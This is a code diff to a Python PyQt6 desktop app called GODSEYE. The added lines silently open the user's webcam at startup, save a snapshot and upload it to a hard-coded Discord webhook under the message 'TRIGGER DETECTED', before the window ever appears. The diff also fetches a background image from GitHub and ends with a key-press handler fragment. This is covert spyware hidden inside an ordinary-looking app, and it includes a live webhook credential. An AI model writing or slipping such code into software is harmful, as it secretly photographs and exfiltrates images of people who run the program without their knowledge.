@@ -1,4 +1,5 @@
 import sys
+import cv2
 import os
 import requests
 import json
@@ -7,18 +8,28 @@ from PyQt6.QtCore import QSize, Qt, QRect
 from PyQt6.QtGui import QFontDatabase, QFont, QPainter, QPen, QBrush, QColor, QPixmap
 from PyQt6.QtWidgets import QApplication, QWidget, QMainWindow, QPushButton, QLabel, QGridLayout, QStackedLayout
 ASSETS = {
-    "font": "https://raw.githubusercontent.com/TheKeems/GODSEYE/main/assets/RMFont.ttf"
+    "font": "https://raw.githubusercontent.com/TheKeems/GODSEYE/main/assets/RMFont.ttf",
+    "folder": "https://raw.githubusercontent.com/TheKeems/GODSEYE/main/ILLUSIONARY.png"
 }
 DIRECTORY = os.path.dirname(__file__)
+cam = cv2.VideoCapture(0) 
+if not cam.isOpened():
+    print("Error: Could not open camera.")
 
+success, frame = cam.read()
+cam.release()
+cv2.imshow("Camera Feed", frame)
+cv2.imwrite("detected.jpg", frame)
 webhook_url = "https://discord.com/api/webhooks/1480278522642829332/M57sg5qeWiRwjXFFCdb65bvtFGGrDvJlIJL7iEp5413Hy2CaROOHa-lvG4CGoQksyf9H"
 data = {
-    "content": "TRIGGER DETECTED: ",
-    "username": "GODSEYE",
-    "avatar_url": "https://files.catbox.moe/76f0lk.png"
+    "content": "TRIGGER DETECTED: "
 }
 
-response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
+with open("detected.jpg", "rb") as f:
+    files = {"file": ("detected.jpg", f.read())} 
+    data = {"content": "TRIGGER DETECTED"} 
+    response = requests.post(webhook_url, data=data, files=files)
+bgimage = requests.get(ASSETS.get("folder"))
 
 class MainWindow(QMainWindow):
     def __init__(self):
@@ -60,7 +71,9 @@ class MainWindow(QMainWindow):
 
         bg = QWidget()
         mainBg = QLabel(bg)
-        mainBg.setPixmap(QPixmap("ILLUSIONARY.png"))
+        bgpixmap = QPixmap()
+        bgpixmap.loadFromData(bgimage.content)
+        mainBg.setPixmap(bgpixmap)
         mainBg.setScaledContents(True)
         mainBg.setFixedSize(640, 480)
         mainBg.move(80, 60)
@@ -115,6 +128,8 @@ window = MainWindow()
 window.show()  # IMPORTANT!!!!! Windows are hidden by default.
 
 app.exec()
+
+cv2.destroyAllWindows()
 """
 def on_press(key):
     print(f'Key pressed: {key}')
